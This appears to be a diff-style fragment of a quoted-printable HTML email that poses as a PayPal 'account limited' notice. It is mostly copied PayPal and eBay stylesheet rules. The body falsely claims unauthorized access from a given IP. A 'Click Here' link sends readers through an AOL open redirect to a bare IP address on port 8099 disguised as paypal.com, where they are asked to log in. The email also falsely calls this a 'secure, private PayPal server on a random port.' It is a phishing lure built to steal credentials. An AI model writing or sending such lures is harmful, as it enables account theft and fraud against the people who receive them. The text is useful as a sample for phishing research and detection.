+TR.tableRowLighterGrey {background-color: #f6f6f6;}
+TR.tableRowWhite {background-color: #fff;}
+TR.tableRowLightBlue {background-color: #cde;}
+TR.tableRowDarkBlue {background-color: #369;}
+TR.tableRowDarkerBlueHeading {background-color: #036; font-size: 11px; fon=
+t-weight: 700;}
+TR.tableRowLightBlueHeading {background-color: #cde; font-size: 11px; font=
+-weight: 700;}
+TR.tableRowLightGreyHeading {background-color: #eee; font-size: 11px; font=
+-weight: 700;}
+TR.tableRowGreyHeading {background-color: #ccc; font-size: 11px; font-weig=
+ht: 700;}
+TD.tableCellHeading {font-size: 13px; font-weight: 700;}
+TD.tableCellHeadingSmall {font-size: 11px; font-weight: 700;}
+TD.tableCellRegular {font-size: 13px; font-weight: 400;}
+TD.tableCellRegularSmall {font-size: 11px; font-weight: 400;}
+TD.tableCellRegularBold {font-size: 13px; font-weight: 700;}
+TD.tableCellRegularSmallBold {font-size: 11px; font-weight: 700;}
+TD.TableCellYellow {background-color: #ffffcc;}
+TD.TableCellSmallYellow {font-size: 11px; background-color:#fffdca;font-we=
+ight: 400;}
+TD.TableCellSmall {font-size: 11px; background-color:#fff;font-weight: 400=
+;}
+TD.TableCellGrey {background-color:  #eee;}
+TABLE.tableOrangeBorder {border-bottom: solid 2px #fc9; border-right: soli=
+d 2px #fc9; border-left: solid 2px #fc9; border-top: solid 2px #fc9;}
+TABLE.tableDarkOrangeBorder {border-bottom: solid 2px #f60; border-right: =
+solid 2px #f60;border-top: solid 2px #f60;border-left: solid 2px #f60;}
+TR.tableRowOrange {background-color: #fc9;}
+TABLE.tableResCenter {border-top: solid 1px #aaa; border-left: solid 1px #=
+aaa; background-color: #fff; border-right: solid 1px #aaa ;}
+TABLE.tableResCenter TD {border-bottom: solid 1px #aaa ;}    
+TABLE.tableContactInfo {border-top: solid 1px #ffcc00; border-left: solid =
+1px #ffcc00; border-right: solid 1px #ffcc00;  border-bottom: solid 1px #f=
+fcc00; background-color:#fffde9;}
+packingslip              {width: 560px;border-width: thin; border-style: =
+solid; border-color: #e2e0e0;}
+
+listHeading {padding-top:3;padding-bottom:4;border-bottom:thin solid #e2e=
+0e0;vertical-align: text-top; text-align: right; font-size: 11px; font-wei=
+ght: 700;}
+ebayemphasis {font-weight: 700; font-family: 'arial';}
+ebaylargeemphasis {font-weight: 700; font-family: 'arial';font-size: 17px=
+;}
+ebaytext {font-family: 'arial'; font-size: 13px;}
+ebaysmall {font-family: 'verdana'; font-size: 10px; font-weight: 400; col=
+or: #666666;}
+ebaysmallemphasis {font-family: 'verdana'; font-size: 10px; font-weight: =
+700; color: #660000;}
+ebayerroremphasis {font-weight: 700; font-family: 'arial'; color: red;}
+SELECT.optionsLong {font-size: 13px; font-family: verdana,arial,helvetica,=
+sans-serif; font-weight: 400; width: 282;}
+SELECT.optionsLongSmallFont {font-size: 11px; font-family: arial,helvetica=
+,sans-serif; font-weight: 400; width: 282;}
+INPUT.textLong {font-size: 13px; font-family: verdana,arial,helvetica,sans=
+-serif; font-weight: 400; width: 282;}
+
+input.tinyInputWidth, select.tinyInputWidth {width: 158px;}
+input.smallInputWidth, select.smallInputWidth {width: 225px;}
+input.mediumInputWidth, select.mediumInputWidth {width: 255px;}
+input.securityInputWidth, select.securityInputWidth {width: 255px;}
+questionPadding {padding-bottom: 6px;}
+#xptContentCustom {width: 760px; margin-left: auto; margin-right: auto; te=
+xt-align: left;}
+TD.oneThirdRow {width: 183px;}
+TD.twoThirdRow {width: 386px;}
+TD.fullRow {width: 589px;}
+TD.oneHalfRow {width: 284px;}
+TD.leftNav {width: 150px;}
+TD.spacer {width: 20px;}
+TD.spacerNav {width: 21px;}
+TD.spacerOneHalfRow {width: 21px;}
+TD.oneThirdRowNoLeftNav {width: 240px;}
+TD.twoThirdRowNoLeftNav {width: 500px;}
+TD.fullRowNoLeftNav {width: 760px;}
+TD.oneHalfRowNoLeftNav {width: 370px;}
+TD.spacerOneHalfRowNoLeftNav {width: 20px;}
+homeInput {font-size: 11px; font-weight: 400; width:120px} 
+table4Boxes .headerColor {background-color: #eee;}
+table4Boxes .border {background-color: #e3e3e3;}
+TD.tableCellLightBlueSmallBold {background-color: #cde; font-size: 11px; f=
+ont-weight: 700;}
+TD.TableCellLightYellow {background-color: #fffde9;}
+merchantFeatureBgColor {background-color: #e9e6d1;}
+TABLE.tableDarkYellowBorder {border-top: solid 2px #ffcc00; border-left: s=
+olid 2px #ffcc00; border-right: solid 2px #ffcc00;  border-bottom: solid 2=
+px #ffcc00; background-color: #fff;}
+TABLE.tableContactInfo {border-top: solid 1px #ffcc00; border-left: solid =
+1px #ffcc00; border-right: solid 1px #ffcc00;  border-bottom: solid 1px #f=
+fcc00; background-color:#fffde9;}
+itemdesc 	{width: 760px;}			
+green          {color: #00aa00;}
+error          {color: #ff0000;}
+orange         {color: #ff9900;}
+packingslip              {width: 560px;border-width: thin; border-style: =
+solid; border-color: #e2e0e0;}
+listHeading {padding-top:3;padding-bottom:4;border-bottom:thin solid #e2e=
+0e0;vertical-align: text-top; text-align: right; font-size: 11px; font-wei=
+ght: 700;}
+ebayemphasis {font-weight: 700; font-family: 'arial';}
+ebaylargeemphasis {font-weight: 700; font-family: 'arial';font-size: 17px=
+;}
+ebaytext {font-family: 'arial'; font-size: 13px;}
+ebaysmall {font-family: 'verdana'; font-size: 10px; font-weight: 400; col=
+or: #666666;}
+ebaysmallemphasis {font-family: 'verdana'; font-size: 10px; font-weight: =
+700; color: #660000;}
+ebayerroremphasis {font-weight: 700; font-family: 'arial'; color: red;}
+SELECT.optionsLong {font-size: 13px; font-family: verdana,arial,helvetica,=
+sans-serif; font-weight: 400; width: 282;}
+INPUT.textLong {font-size: 13px; font-family: verdana,arial,helvetica,sans=
+-serif; font-weight: 400; width: 282;}
+smallFontTable TD {font-size: 11px; font-weight: 400;} 
+bcupsellbox            {background-color: #ffffcc; border: 1px solid #ccc=
+; padding: 3px; font-size: 11px;}
+invoice_note {width: 600px;margin-top:10px;margin-bottom:10px;}
+invoice {width: 600px;border-collapse: collapse;border:1px solid #aaa;}
+invoice td {font-size:11px;border:1px solid #ccc;padding:2px;}
+invoice tr.title td {font-weight:bold;line-height:20px;text-align:left;ba=
+ckground-color: #ccddee;}
+invoice td.currency {border-right:1px solid #fff;}
+invoice td.calc {font-weight:bold; text-align:left;}
+currency_highlight {background-color: #ffffcc;}
+tax {font-weight: 400;float: left;}
+h1 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px 0px; display: i=
+nline;}
+h2 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px 0px; display: i=
+nline;}
+h3 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px 0px; display: i=
+nline;}
+h4 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px 0px; display: i=
+nline;}
+h5 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px 0px; display: i=
+nline;}
+h6 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px 0px; display: i=
+nline;}
+#xptContentMain h1 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px=
+ 0px; display: inline;}
+#xptContentMain h2 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px=
+ 0px; display: inline;}
+#xptContentMain h3 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px=
+ 0px; display: inline;}
+#xptContentMain h4 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px=
+ 0px; display: inline;}
+#xptContentMain h5 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px=
+ 0px; display: inline;}
+#xptContentMain h6 {font-size: 13px; font-weight: 400; margin: 0px 0px 0px=
+ 0px; display: inline;}
+#historyminilog table
+{
+	border-collapse: collapse;
+}
+
+#historyminilog .tableheader
+{
+	font-size: 13px;
+	/*font-weight: 700;*/
+	padding: 4px;
+	background-color: #eeeeee;			
+}
+
+#historyminilog .columnheader
+{
+	font-size: 11px; 
+	font-weight: 700;
+	background-color: #ccddee;
+	padding:4px;
+	border: 1px solid #aaaaaa;		
+}
+
+#historyminilog td
+{
+	font-size: 11px;
+	padding: 4px;
+	border: 1px solid #aaaaaa;
+}
+
+#historyminilog .summaryleft
+{
+	font-size: 11px;
+	padding: 4px;
+	background-color: #ffffff;
+	border-right: 0px;
+	border-left: 1px solid #aaaaaa;
+}
+
+#historyminilog .summaryright
+{
+	font-size: 11px;
+	padding: 4px;
+	background-color: #ffffff;
+	border-right: 1px solid #c0c0c0;
+	border-left: 0px;
+}
+
+#historyminilog .summarymiddle
+{
+	font-size: 11px;
+	padding: 4px;
+	background-color: #ffffff;
+	border-right: 0px;
+	border-left: 0px;
+}
+
+#historyminilog .noborder
+{
+	border: 0px;
+	padding: 4px;
+	background-color: #ffffff;
+}
+
+#historyminilog .tableheader .greybg
+{
+	padding: 0px;
+	spacing: 0px;
+	font-size: 13px;
+	background-color: #eeeeee;
+	border: 0px;
+}
+</style>
+<link href=3D"/en_US/i/icon/pp_favicon_x.ico" rel=3D"shortcut icon">
+<script src=3D"/js/pp_main.js"></script></head><body><div><div id=3D"xptHe=
+ader"><table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D=
+"0"><tr><tr valign=3D"top">	<td><A target=3D"_blank" href=3D"https://www.p=
+aypal.com/us">		
+  <IMG src=3D"http://images.paypal.com/en_US/i/logo/email_logo.gif" alt=3D=
+"PayPal" border=3D"0" width=3D"255" height=3D"35"></A>	</td></tr><tr>	<td =
+background=3D"http://images.paypal.com/images/bg_clk.gif" width=3D100=
+%>		<img src=3D"http://images.paypal.com/images/pixel.gif" height=3D"29" w=
+idth=3D"1" border=3D"0">	</td></tr>	</tr></table></div><div id=3D"xptConte=
+ntMain"><table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=
+=3D"0" width=3D"600"><tr><td><img alt=3D"" border=3D"0" height=3D"1" src=3D=
+"https://www.paypal.com/en_US/i/scr/pixel.gif" width=3D"600"></td></tr><tr=
+><td><div id=3D"xptTitle"><table align=3D"center" border=3D"0" cellpadding=
+=3D"0" cellspacing=3D"0" class=3D"main"><tr><td class=3D"heading" width=3D=
+"100%"></td></tr><tr><td><img alt=3D"" border=3D"0" height=3D"2" src=3D"ht=
+tps://www.paypal.com/en_US/i/scr/pixel.gif" width=3D"1"></td></tr></table>=
+</div></td></tr><tr><td valign=3D"top"> PayPal is constantly working to en=
+sure security by regularly screening the accounts in our system. We recent=
+ly reviewed your account, and we need more information to help us provide =
+you with secure service. Until we can collect this information, your acces=
+s to sensitive account features will be limited. We would like to restore =
+your access as soon as possible, and we apologize for the inconvenience. <=
+br><hr class=3D"dotted"><span class=3D"emphasis">Why is my account access =
+limited?</span><br class=3D"h6">Your account access has been limited for t=
+he following reason(s):<br><li>Your account was accessed by an unauthorize=
+d 3rd party from  the ip <b>147.34.81.22</b><br><br><li>
+  <span class=3D"emphasis">How can I restore my account access?</span><br>=
+<table align=3D"center" bgcolor=3D"#cc9999" cellpadding=3D"1" cellspacing=3D=
+"0" width=3D"100%"><tr><td><table align=3D"center" bgcolor=3D"#ffeeee" cel=
+lpadding=3D"5" cellspacing=3D"0" width=3D"100%"><tr><td>
+    <span class=3D"emphasis"> <a href=3D"http://www.aol.com/redir.adp?_url=
+=3Dhttp://216.136.49.66:8099/www.paypal.com/">
+    Click Here</a>, login and complete the next step to "Remove Limitation=
+s."
+    </span></td></tr></table></td></tr></table><br>Completing all of the i=
+nformation required will automatically restore your account access.<BR><BR=
+>You will be redirected to a secure, private PayPal server on a random por=
+t due security issues.<hr class=3D"dotted"></td></tr></table></div>
+<div id=3D"xptFooter">
+<table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
+<tr><td>
+<p>PayPal, an eBay company</p>
+<p class=3D"lastPara">
+Copyright =A9 1999-2007 PayPal. All rights reserved.<br>
+<a href=3D"https://www.paypal.com/us/cgi-bin/webscr?cmd=3Dp/gen/fdic">Info=
+rmation about FDIC pass-through insurance
+</a>
+<br></p></td></tr></table><br></div>
+<img height=3D"1" width=3D"1" src=3D"https://102.112.2O7.net/b/ss/paypalun=
+tracked/1/G.4--NS/2080080440?pageName=3DLimited%20Account%20Access=
+%20Details::p/acc/help-restrictedaccts::_login-done&c6=3D4DC74027BF544433J=
+&c7=3DPersonal&c8=3DVerified&c9=3DRestricted&c10=3DUS&c12=3DUnknown" borde=
+r=3D"0" alt=3D""></div></body>
+</html>
+
+----2655954088913741--
